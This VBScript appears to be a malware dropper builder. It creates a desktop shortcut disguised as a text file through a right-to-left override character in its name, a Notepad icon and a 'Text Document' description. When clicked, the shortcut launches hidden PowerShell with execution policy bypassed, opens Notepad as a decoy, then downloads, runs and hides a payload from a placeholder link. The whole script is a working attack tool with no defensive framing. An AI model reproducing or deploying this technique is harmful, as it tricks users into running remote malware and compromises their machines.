' https://bit.ly/35EqHGw 
' edited suXjung

Dim DownLoadLink, FileName
DownLoadLink = "'Direct Link'"
FileName = "'FILENAME HERE'"

Set WshShell = CreateObject("WScript.Shell")
Set ShApp = CreateObject("Shell.Application")
DesktopPath = ShApp.Namespace(0).Self.Path
unicode = Unescape("%u0052%u0065%u0061%u0064%u004d%u0065%u005f%u202e%u0074%u0078%u0074%u002e%u006c%u006e%u006b")
unicodeName = "unicode.lnk"
shortcutPath = DesktopPath & "\" & unicodeName
Set lnk = WshShell.CreateShortcut(shortcutPath)
lnk.TargetPath = "powershell.exe"
lnk.Arguments =  "-ExecutionPolicy Bypass -WindowStyle Hidden -Command notepad.exe;(new-object System.Net.WebClient).DownloadFile(" & DownLoadLink & "," & FileName & ");./" & Filename & ";(get-item " & Filename & ").Attributes += 'Hidden';"
lnk.IconLocation = "c:\windows\system32\notepad.exe"
lnk.Description = "Type: Text Document"
lnk.Save()
Set FSO = CreateObject("Scripting.FileSystemObject")
Set file = FSO.GetFile(shortcutPath)
file.name = unicode & ".lnk"